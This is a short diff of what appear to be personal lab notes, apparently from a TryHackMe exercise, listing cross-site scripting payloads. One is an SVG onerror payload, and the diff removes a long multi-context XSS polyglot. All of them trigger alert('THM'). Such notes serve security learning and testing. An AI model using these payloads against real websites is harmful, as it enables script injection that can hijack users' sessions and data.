@@ -25,4 +25,3 @@ not:    use innerHTML to Know filter edit
     6.<svg/src=1 onerror=alert()>
 
 Awasome Script
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
